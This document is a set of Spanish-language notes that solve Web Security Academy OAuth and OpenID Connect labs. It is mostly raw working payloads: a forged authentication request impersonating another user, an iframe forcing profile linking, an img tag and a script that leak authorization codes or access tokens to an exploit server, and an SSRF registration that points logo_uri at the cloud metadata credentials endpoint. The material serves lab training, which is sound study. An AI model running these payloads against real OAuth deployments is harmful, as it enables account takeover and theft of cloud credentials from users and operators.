Descubrir comunicación de provedor OpenID Connect -> https://idp.example.com/.well-known/openid-configuration

## Lab: Authentication bypass via OAuth implicit flow 

```
POST /authenticate HTTP/2
Host: 0aab006d03763a8294dcb510003c00f8.web-security-academy.net
Cookie: session=DNNiKj3fNCBx8zG7Nkn9PO7fRIV9PQzN
Content-Length: 111
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: application/json
Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
Origin: https://0aab006d03763a8294dcb510003c00f8.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0aab006d03763a8294dcb510003c00f8.web-security-academy.net/oauth-callback
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Priority: u=1, i

{"email":"carlos@carlos-montoya.net","username":"carlos","token":"WI71r1o6gbHIkTC7SaOAzU0JheRE-yS3p5585FUx9VM"}
```

## Lab: Forced OAuth profile linking

```
<iframe src="https://0a9e0026030d88068030e4c3005f00e0.web-security-academy.net/oauth-linking?code=NSt63ElTbV69tWX5IBy-YAVq13xoqxeSz7cb-La9KdI"></iframe> 
```

## Lab: OAuth account hijacking via redirect_uri 

```
<img src="https://oauth-0aed004003a9de35820372ef024e00c1.oauth-server.net/auth?client_id=rsrlwkd4dcgmqac71uu4h&redirect_uri=https://exploit-0a2c00820357ded682fd73a001f2003f.exploit-server.net/exploit&response_type=code&scope=openid%20profile%20email">
```

## Lab: Stealing OAuth access tokens via an open redirect

```
<script>
if(!document.location.hash) {
window.location = 'https://oauth-0a6800220430b7d280873d3c02e700dc.oauth-server.net/auth?client_id=hu7ukb5y8pvlzl5zr6jyw&redirect_uri=https://0ad300aa0415b71680493f75008b005e.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a4700e004dab7ef803e3ea901060091.exploit-server.net/exploit&response_type=token&nonce=-1683248783&scope=openid%20profile%20email' 
} else {
window.location = '/code?'+document.location.hash.substr(1); 
}
</script>
```

## Lab: SSRF via OpenID dynamic client registration

Registrar client app 
```
POST /reg HTTP/2
Host: oauth-0a7a00a8042d6a758018bae8023e00ed.oauth-server.net
Content-Type: application/json
Content-Length: 273

{
  "redirect_uris": ["http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"],
"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/",
  "client_name": "MiApp",
  "token_endpoint_auth_method": "client_secret_post"
}
```

Obtener la data
```
GET /client/<clien_id app de nosotros>/logo HTTP/2
Host: oauth-0a7a00a8042d6a758018bae8023e00ed.oauth-server.net
```

